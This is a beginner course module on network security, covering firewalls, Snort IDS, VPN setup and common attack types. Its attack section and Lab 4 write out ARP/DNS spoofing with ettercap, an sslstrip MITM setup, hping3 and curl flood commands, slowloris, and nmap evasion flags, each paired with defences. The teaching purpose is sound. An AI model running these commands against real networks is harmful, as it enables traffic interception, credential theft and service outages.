# 🛡️ Level 1 - Network Security

> **Objective**: Learn network security fundamentals and understand basic attack types

## 📚 Table of Contents

1. [Network Security Fundamentals](#network-security-fundamentals)
2. [Firewall Technologies](#firewall-technologies)
3. [Intrusion Detection Systems (IDS)](#intrusion-detection-systems-ids)
4. [Virtual Private Networks (VPN)](#virtual-private-networks-vpn)
5. [Network Attack Types](#network-attack-types)
6. [Network Security Tools](#network-security-tools)
7. [Practical Laboratories](#practical-laboratories)
8. [Real-World Scenarios](#real-world-scenarios)

---

## 🏗️ Network Security Fundamentals

### 🎯 Network Security Objectives

**Defense in Depth**:
```
┌─────────────────────────────────────┐
│           Perimeter Security        │  ← Firewall, IPS
│  ┌───────────────────────────────┐  │
│  │        Network Security       │  │  ← VLAN, NAC
│  │  ┌─────────────────────────┐  │  │
│  │  │     Host Security       │  │  │  ← Antivirus, HIPS
│  │  │  ┌───────────────────┐  │  │  │
│  │  │  │  Application      │  │  │  │  ← WAF, Code Review
│  │  │  │    Security       │  │  │  │
│  │  │  │  ┌─────────────┐  │  │  │  │
│  │  │  │  │    Data     │  │  │  │  │  ← Encryption, DLP
│  │  │  │  │  Security   │  │  │  │  │
│  │  │  │  └─────────────┘  │  │  │  │
│  │  │  └───────────────────┘  │  │  │
│  │  └─────────────────────────┘  │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

### 🔐 Network Security Principles

#### 1. **Least Privilege**
- Granting users only the minimum necessary privileges
- Access control through network segmentation
- Role-based access control (RBAC)

#### 2. **Zero Trust Model**
```
Traditional Model: "Trust but Verify"
Zero Trust Model: "Never Trust, Always Verify"

┌─────────────────┐    ┌─────────────────┐
│   Trusted Zone  │    │  Everything is  │
│                 │ vs │   Untrusted     │
│  Untrusted Zone │    │                 │
└─────────────────┘    └─────────────────┘
```

#### 3. **Network Segmentation**
- Logical separation with VLANs
- Physical separation with subnets
- Micro-segmentation

---

## 🔥 Firewall Technologies

### 📊 Firewall Types

| Type | Layer | Features | Advantages | Disadvantages |
|------|-------|----------|------------|---------------|
| **Packet Filter** | L3-L4 | IP, Port filtering | Fast, simple | Stateless, limited |
| **Stateful** | L3-L4 | Connection tracking | Secure, intelligent | Slower |
| **Application** | L7 | Application analysis | Detailed control | Slow, complex |
| **Next-Gen** | L3-L7 | IPS, DPI, SSL inspection | Comprehensive protection | Expensive, complex |

### 🔧 Firewall Configuration

#### **iptables (Linux) Examples**:
```bash
#!/bin/bash
# Basic Firewall Rules

# Clear existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback traffic
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH access (port 22)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT

# Web service (port 80, 443)
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT

# DNS (port 53)
iptables -A INPUT -p tcp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT

# ICMP (ping) - limited
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT

# Rate limiting - Brute force protection
iptables -A INPUT -p tcp --dport 22 -m recent --name SSH --set
iptables -A INPUT -p tcp --dport 22 -m recent --name SSH --rcheck --seconds 60 --hitcount 4 -j DROP

# Log dropped packets
iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables denied: " --log-level 7

# Save rules
iptables-save > /etc/iptables/rules.v4
```

#### **pfSense Configuration**:
```xml
<!-- pfSense Firewall Rule Example -->
<rule>
    <type>pass</type>
    <interface>wan</interface>
    <protocol>tcp</protocol>
    <source>
        <any>1</any>
    </source>
    <destination>
        <network>wanip</network>
        <port>443</port>
    </destination>
    <descr>Allow HTTPS to web server</descr>
</rule>
```

### 🔍 Firewall Monitoring

**Log Analysis**:
```bash
# Monitor iptables logs
tail -f /var/log/syslog | grep "iptables denied"

# Most blocked IPs
grep "iptables denied" /var/log/syslog | awk '{print $13}' | cut -d'=' -f2 | sort | uniq -c | sort -nr | head -10

# Port scan detection
grep "iptables denied" /var/log/syslog | grep "DPT=22" | awk '{print $13}' | cut -d'=' -f2 | sort | uniq -c | sort -nr
```

---

## 🚨 Intrusion Detection Systems (IDS)

### 📊 IDS Types

#### **Network-based IDS (NIDS)**
- Monitors network traffic
- Operates in promiscuous mode
- Real-time analysis

#### **Host-based IDS (HIDS)**
- Monitors system logs
- File integrity checking
- System behavior analysis

### 🔧 Snort IDS Configuration

**Snort Rule Examples**:
```bash
# /etc/snort/rules/local.rules

# ICMP ping flood detection
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Flood"; itype:8; threshold:type both, track by_src, count 10, seconds 5; sid:1000001; rev:1;)

# Port scan detection
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold:type both, track by_src, count 20, seconds 60; sid:1000002; rev:1;)

# SQL Injection detection
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; content:"union"; nocase; content:"select"; nocase; distance:0; within:100; sid:1000003; rev:1;)

# Brute force SSH detection
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server,established; content:"SSH-"; offset:0; depth:4; threshold:type both, track by_src, count 5, seconds 60; sid:1000004; rev:1;)

# Malware callback detection
alert tcp $HOME_NET any -> any any (msg:"Possible Malware Callback"; content:"User-Agent: "; content:"bot"; nocase; distance:0; within:50; sid:1000005; rev:1;)
```

**Snort Configuration**:
```bash
# /etc/snort/snort.conf

# Network variables
var HOME_NET 192.168.1.0/24
var EXTERNAL_NET !$HOME_NET
var DNS_SERVERS $HOME_NET
var SMTP_SERVERS $HOME_NET
var HTTP_SERVERS $HOME_NET
var SQL_SERVERS $HOME_NET
var TELNET_SERVERS $HOME_NET
var SSH_SERVERS $HOME_NET

# Port variables
var HTTP_PORTS [80,443,8080,8443]
var SHELLCODE_PORTS !80
var ORACLE_PORTS 1521
var SSH_PORTS 22

# Preprocessors
preprocessor frag3_global: max_frags 65536
preprocessor frag3_engine: policy windows detect_anomalies overlap_limit 10 min_fragment_length 100 timeout 180

preprocessor stream5_global: track_tcp yes, track_udp yes, track_icmp no, max_tcp 262144, max_udp 131072, max_active_responses 2, min_response_seconds 5
preprocessor stream5_tcp: policy windows, detect_anomalies, require_3whs 180, overlap_limit 10, small_segments 3 bytes 150, timeout 180, ports client 21 22 23 25 42 53 79 109 110 111 113 119 135 136 137 139 143 161 445 513 514 587 593 691 1433 1521 2100 3306 6665 6666 6667 6668 6669 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779, ports both 80 443 465 563 636 989 992 993 994 995 7801 7802 7803 7804 7805 7806 7807 7808 7809 7810 7811 7812 7813 7814 7815 7816 7817 7818 7819 7820

# Output modules
output alert_syslog: LOG_AUTH LOG_ALERT
output log_tcpdump: tcpdump.log
output database: alert, mysql, user=snort password=password dbname=snort host=localhost

# Rule files
include $RULE_PATH/local.rules
include $RULE_PATH/emerging-threats.rules
```

### 📊 SIEM Integration

**ELK Stack Log Analysis**:
```yaml
# logstash.conf
input {
  file {
    path => "/var/log/snort/alert"
    start_position => "beginning"
    type => "snort"
  }
}

filter {
  if [type] == "snort" {
    grok {
      match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{WORD:sensor} %{DATA:alert_msg} \[Classification: %{DATA:classification}\] \[Priority: %{NUMBER:priority}\] %{DATA} %{IP:src_ip}:%{NUMBER:src_port} -> %{IP:dest_ip}:%{NUMBER:dest_port}" }
    }
    
    date {
      match => [ "timestamp", "yyyy-MM-dd HH:mm:ss" ]
    }
    
    mutate {
      convert => { "priority" => "integer" }
      convert => { "src_port" => "integer" }
      convert => { "dest_port" => "integer" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "snort-%{+YYYY.MM.dd}"
  }
}
```

---

## 🔐 Virtual Private Networks (VPN)

### 📊 VPN Types

| Type | Protocol | Security | Performance | Usage |
|------|----------|----------|-------------|-------|
| **IPSec** | ESP/AH | Very High | Medium | Site-to-Site |
| **OpenVPN** | SSL/TLS | High | Good | Remote Access |
| **WireGuard** | ChaCha20 | High | Very Good | Modern VPN |
| **PPTP** | MPPE | Low | High | Legacy systems |
| **L2TP/IPSec** | IPSec | High | Medium | Windows integration |

### 🔧 OpenVPN Server Setup

**Server Configuration**:
```bash
# /etc/openvpn/server.conf

port 1194
proto udp
dev tun

# SSL/TLS root certificate (ca), certificate
# (cert), and private key (key)
ca ca.crt
cert server.crt
key server.key

# Diffie hellman parameters
dh dh2048.pem

# Network topology
topology subnet

# Configure server mode and supply a VPN subnet
server 10.8.0.0 255.255.255.0

# Maintain a record of client <-> virtual IP address
ifconfig-pool-persist ipp.txt

# Push routes to the client
push "route 192.168.1.0 255.255.255.0"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"

# Enable compression
comp-lzo

# The keepalive directive causes ping-like
keepalive 10 120

# TLS-Auth
tls-auth ta.key 0

# Select a cryptographic cipher
cipher AES-256-CBC

# Enable compression on the VPN link
comp-lzo

# The maximum number of concurrently connected clients
max-clients 100

# Run as unprivileged user
user nobody
group nogroup

# The persist options will try to avoid
persist-key
persist-tun

# Output a short status file
status openvpn-status.log

# Log verbosity
verb 3

# Silence repeating messages
mute 20
```

**Client Configuration**:
```bash
# client.ovpn

client
dev tun
proto udp
remote your-server-ip 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client.crt
key client.key
tls-auth ta.key 1
cipher AES-256-CBC
comp-lzo
verb 3
```

### 🔧 WireGuard Configuration

**Server Configuration**:
```ini
# /etc/wireguard/wg0.conf

[Interface]
PrivateKey = SERVER_PRIVATE_KEY
Address = 10.0.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = CLIENT_PUBLIC_KEY
AllowedIPs = 10.0.0.2/32
```

**Client Configuration**:
```ini
# client.conf

[Interface]
PrivateKey = CLIENT_PRIVATE_KEY
Address = 10.0.0.2/24
DNS = 8.8.8.8

[Peer]
PublicKey = SERVER_PUBLIC_KEY
Endpoint = your-server-ip:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

---

## ⚔️ Network Attack Types

### 🎭 ARP Spoofing/Poisoning

**Attack Principle**:
```
Normal ARP:
1. Host A: "What is the MAC address of 192.168.1.1?" (Broadcast)
2. Router: "192.168.1.1 is me, MAC: aa:bb:cc:dd:ee:ff"

ARP Spoofing:
1. Host A: "What is the MAC address of 192.168.1.1?" (Broadcast)
2. Attacker: "192.168.1.1 is me, MAC: 11:22:33:44:55:66" (Fake)
3. Host A: Sends traffic to attacker
```

**ARP Spoofing with Ettercap**:
```bash
# Scan targets
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Target entire network
ettercap -T -M arp:remote /192.168.1.1// //

# Combined with DNS spoofing
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// //
```

**Protection Methods**:
```bash
# Static ARP table
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# ARP monitoring
arpwatch -i eth0

# Switch port security
switchport port-security
switchport port-security mac-address sticky
```

### 🌊 DNS Spoofing

**Attack Scenario**:
```bash
# /etc/ettercap/etter.dns
# DNS spoofing configuration

www.bank.com      A   192.168.1.100
*.facebook.com    A   192.168.1.100
*.google.com      A   192.168.1.100
```

**Protection**:
```bash
# DNS over HTTPS (DoH)
nslookup google.com 1.1.1.1

# DNS over TLS (DoT)
dig @1.1.1.1 +tls google.com

# DNSSEC validation
dig +dnssec google.com
```

### 💥 DDoS Attacks

#### **Volumetric Attacks**
```bash
# UDP Flood
hping3 -2 -p 80 --flood target.com

# ICMP Flood
hping3 -1 --flood target.com

# SYN Flood
hping3 -S -p 80 --flood target.com
```

#### **Application Layer Attacks**
```bash
# HTTP GET Flood
for i in {1..1000}; do
  curl -H "User-Agent: Bot$i" http://target.com/ &
done

# Slowloris Attack
slowloris.py target.com -p 80 -s 1000
```

**DDoS Protection**:
```bash
# Rate limiting (iptables)
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# SYN flood protection
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
echo 2048 > /proc/sys/net/ipv4/tcp_max_syn_backlog

# Connection tracking
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m conntrack --ctstate NEW -m limit --limit 50/second --limit-burst 100 -j ACCEPT
```

### 🕵️ Man-in-the-Middle (MITM)

**SSL Strip Attack**:
```bash
# sslstrip installation
apt-get install sslstrip

# Traffic redirection
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Start sslstrip
sslstrip -l 8080

# Combined with ARP spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

**Protection**:
```bash
# HSTS (HTTP Strict Transport Security)
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Certificate pinning
# Public key pinning
Public-Key-Pins: pin-sha256="base64+primary=="; pin-sha256="base64+backup=="; max-age=5184000
```

---

## 🛠️ Network Security Tools

### 🔍 Network Scanning

**Advanced Nmap Usage**:
```bash
# Stealth SYN scan
nmap -sS -T4 -A -v target.com

# UDP scan
nmap -sU --top-ports 1000 target.com

# Script scanning
nmap --script vuln target.com
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script http-enum target.com

# Timing templates
nmap -T0  # Paranoid (very slow)
nmap -T1  # Sneaky (slow)
nmap -T2  # Polite (normal)
nmap -T3  # Normal (default)
nmap -T4  # Aggressive (fast)
nmap -T5  # Insane (very fast)

# Firewall evasion
nmap -f target.com                    # Fragment packets
nmap -D RND:10 target.com            # Decoy scan
nmap --source-port 53 target.com     # Source port manipulation
nmap --data-length 25 target.com     # Append random data
```

### 📊 Network Monitoring

**Advanced Wireshark Filters**:
```bash
# Suspicious traffic
tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size <= 1024

# DNS tunneling detection
dns and frame.len > 512

# Beaconing traffic
http.request and frame.time_delta > 60

# Credential harvesting
http.request.method == "POST" and (http contains "password" or http contains "login")

# Malware C&C
tcp.port == 443 and ssl.handshake.type == 1 and ssl.handshake.extensions_server_name contains ".tk"
```

**tshark Command Line**:
```bash
# Live capture and analysis
tshark -i eth0 -f "tcp port 80" -T fields -e ip.src -e ip.dst -e http.host

# File analysis
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri

# Statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z http,tree
```

### 🔧 Network Security Tools

**Nessus Vulnerability Scanner**:
```bash
# Nessus installation
wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/12345/download?i_agree_to_tenable_license_agreement=true
dpkg -i Nessus-8.15.0-ubuntu1110_amd64.deb

# Start service
systemctl start nessusd
systemctl enable nessusd

# Web interface: https://localhost:8834
```

**OpenVAS Installation**:
```bash
# OpenVAS installation (Kali Linux)
apt update && apt install openvas

# Setup and configuration
gvm-setup

# Start service
gvm-start

# Web interface: https://localhost:9392
```

---

## 🧪 Practical Laboratories

### 🔬 Lab 1: Firewall Configuration

**Objective**: Create basic firewall rules

**Scenario**: Security rules for web server

**Steps**:
```bash
# 1. Clear existing rules
sudo iptables -F
sudo iptables -X

# 2. Set default policies
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 3. Allow loopback traffic
sudo iptables -A INPUT -i lo -j ACCEPT

# 4. Allow established connections
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 5. SSH access (from specific IP only)
sudo iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT

# 6. Web service
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 7. Rate limiting
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# 8. Test rules
curl -I http://localhost
nmap -p 22,80,443 localhost

# 9. Save rules
sudo iptables-save > /etc/iptables/rules.v4
```

### 🔬 Lab 2: IDS Installation and Configuration

**Objective**: Install and configure Snort IDS

**Steps**:
```bash
# 1. Snort installation
sudo apt update
sudo apt install snort

# 2. Network configuration
sudo nano /etc/snort/snort.conf
# Set HOME_NET variable

# 3. Create custom rules
sudo nano /etc/snort/rules/local.rules

# Port scan detection
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold:type both, track by_src, count 10, seconds 60; sid:1000001;)

# ICMP flood detection
alert icmp any any -> $HOME_NET any (msg:"ICMP Flood"; itype:8; threshold:type both, track by_src, count 10, seconds 5; sid:1000002;)

# 4. Test Snort in test mode
sudo snort -T -c /etc/snort/snort.conf

# 5. Start Snort in daemon mode
sudo snort -D -c /etc/snort/snort.conf -i eth0

# 6. Monitor logs
sudo tail -f /var/log/snort/alert

# 7. Perform test attacks
nmap -sS localhost
ping -f localhost
```

### 🔬 Lab 3: VPN Setup

**Objective**: Set up OpenVPN server

**Steps**:
```bash
# 1. OpenVPN installation
sudo apt install openvpn easy-rsa

# 2. CA setup
make-cadir ~/openvpn-ca
cd ~/openvpn-ca

# 3. Edit CA variables
nano vars
export KEY_COUNTRY="US"
export KEY_PROVINCE="State"
export KEY_CITY="City"
export KEY_ORG="MyCompany"
export KEY_EMAIL="admin@mycompany.com"
export KEY_OU="IT"

# 4. Create CA
source vars
./clean-all
./build-ca

# 5. Create server certificate
./build-key-server server

# 6. Diffie-Hellman parameters
./build-dh

# 7. TLS-Auth key
openvpn --genkey --secret keys/ta.key

# 8. Client certificate
./build-key client1

# 9. Server configuration
sudo cp ~/openvpn-ca/keys/{server.crt,server.key,ca.crt,dh2048.pem,ta.key} /etc/openvpn/
sudo nano /etc/openvpn/server.conf

# 10. Start OpenVPN service
sudo systemctl start openvpn@server
sudo systemctl enable openvpn@server

# 11. Create client configuration file
# Prepare client.ovpn file
```

### 🔬 Lab 4: Network Attack Simulation

**Objective**: Test network attacks in controlled environment

**Requirements**: 2 VMs (Kali Linux + Ubuntu)

**Steps**:
```bash
# Kali Linux (Attacker)

# 1. Network discovery
nmap -sn 192.168.1.0/24

# 2. Target scanning
nmap -sS -A 192.168.1.100

# 3. ARP spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# 4. DNS spoofing
# Edit /etc/ettercap/etter.dns file
echo "www.google.com A 192.168.1.50" >> /etc/ettercap/etter.dns
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//

# 5. SSL Strip
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Ubuntu (Target)

# 1. Monitor network traffic
sudo tcpdump -i eth0 -w capture.pcap

# 2. Check ARP table
arp -a
watch -n 1 arp -a

# 3. Test DNS queries
nslookup www.google.com

# 4. Test HTTPS connections
curl -I https://www.google.com
```

---

## 🌍 Real-World Scenarios

### 🏢 Scenario 1: Enterprise Network Security

**Situation**: 500-person company, hybrid work model

**Requirements**:
- Remote access VPN
- Network segmentation
- IDS/IPS system
- Firewall policies

**Solution Architecture**:
```
Internet
    |
[Firewall/UTM]
    |
[DMZ] - Web Server, Mail Server
    |
[Core Switch]
    |
+-- [VLAN 10] Management
+-- [VLAN 20] Servers
+-- [VLAN 30] Users
+-- [VLAN 40] Guests
+-- [VLAN 50] IoT Devices
```

**Security Policies**:
```bash
# Inter-VLAN access rules
# Users -> Servers (only necessary ports)
iptables -A FORWARD -s 192.168.30.0/24 -d 192.168.20.0/24 -p tcp --dport 80,443 -j ACCEPT

# Management -> All (admin access)
iptables -A FORWARD -s 192.168.10.0/24 -j ACCEPT

# Guests -> Internet only
iptables -A FORWARD -s 192.168.40.0/24 -d 192.168.0.0/16 -j DROP
iptables -A FORWARD -s 192.168.40.0/24 -o eth0 -j ACCEPT

# IoT -> Isolated
iptables -A FORWARD -s 192.168.50.0/24 -d 192.168.0.0/16 -j DROP
```

### 🏥 Scenario 2: Hospital Network Security

**Situation**: Hospital requiring HIPAA compliance

**Critical Requirements**:
- Patient data protection
- Medical device security
- Audit logging
- Incident response

**Security Architecture**:
```
[Medical Devices VLAN] - Isolated, monitored
[Patient Data VLAN] - Encrypted, access controlled
[Staff VLAN] - Role-based access
[Guest VLAN] - Internet only
```

**Monitoring and Compliance**:
```bash
# HIPAA audit logging
rsyslog configuration for centralized logging
SIEM rules for data access monitoring
DLP (Data Loss Prevention) policies
Encryption at rest and in transit
```

### 🏭 Scenario 3: Industrial Network Security (OT)

**Situation**: Manufacturing facility, SCADA systems

**Special Requirements**:
- Air-gapped networks
- Legacy system support
- Real-time monitoring
- Safety systems protection

**Purdue Model Implementation**:
```
Level 4: Business Network
Level 3: Manufacturing Operations
Level 2: Supervisory Control (SCADA/HMI)
Level 1: Basic Control (PLC/DCS)
Level 0: Physical Process
```

---

## 📚 Additional Resources

### 📖 Recommended Books
- "Network Security Essentials" - William Stallings
- "Firewalls and Internet Security" - Cheswick & Bellovin
- "Intrusion Detection and Prevention" - Carl Endorf
- "VPNs Illustrated" - Jon Snader

### 🛠️ Practical Tools
```bash
# Network Security
nmap, masscan, zmap          # Network scanning
wireshark, tcpdump, tshark   # Packet analysis
snort, suricata, zeek        # IDS/IPS
openvpn, strongswan          # VPN

# Penetration Testing
ettercap, bettercap          # MITM attacks
hping3, scapy               # Packet crafting
aircrack-ng                 # Wireless security
metasploit                  # Exploitation framework

# Monitoring
nagios, zabbix              # Network monitoring
splunk, elk                 # Log analysis
ntopng, darkstat            # Traffic analysis
```

### 🌐 Online Platforms
- **TryHackMe**: Network Security room
- **HackTheBox**: Network penetration testing
- **VulnHub**: Vulnerable VMs
- **SANS NetWars**: Network security challenges

---

## ✅ Level 1 - Network Security Completion Criteria

### 📋 Theoretical Knowledge
- [ ] Understanding firewall types and configuration
- [ ] Understanding IDS/IPS systems
- [ ] Ability to compare VPN technologies
- [ ] Ability to identify network attack types
- [ ] Ability to apply Defense in Depth principles

### 🛠️ Practical Skills
- [ ] Ability to write firewall rules with iptables
- [ ] Ability to configure Snort IDS
- [ ] Ability to set up OpenVPN server
- [ ] Ability to detect network attacks
- [ ] Ability to perform traffic analysis with Wireshark

### 🎯 Lab Completion
- [ ] Lab 1: Firewall configuration completed
- [ ] Lab 2: IDS installation completed
- [ ] Lab 3: VPN setup completed
- [ ] Lab 4: Attack simulation completed

### 📈 Next Step
**Ready to advance to Level 2?**

✅ If you meet all criteria → [Level 2 - Penetration Testing](../level-2/penetration-testing.md)

❌ If you have gaps → Review this section again

---

**🎯 Objective Completed**: You have learned network security fundamentals!

**📚 Next Lesson**: [OWASP Top 10](./owasp-top10.md)

---

*Last updated: 2025 | Level: Beginner | Duration: 2-3 weeks*